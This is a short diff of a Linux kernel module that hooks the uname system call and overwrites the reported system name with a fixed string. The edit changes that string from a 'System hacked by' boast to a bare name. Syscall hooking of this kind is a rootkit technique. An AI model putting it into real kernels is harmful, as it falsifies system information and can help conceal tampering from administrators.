@@ -21,8 +21,8 @@ asmlinkage long (*orig_sys_uname)(struct old_utsname *buf);
 asmlinkage long syscall_replace_sys_uname(struct old_utsname *buf)
 {
     long ret;
-    char str[] = "The System hacked by rangosta\n";
-    printk(KERN_INFO "The System hacked by rangosta\n");
+    char str[] = "rangosta";
+    printk(KERN_INFO "rangosta");
     ret = orig_sys_uname(buf);
     strncpy(buf->sysname, str, sizeof(str));
     
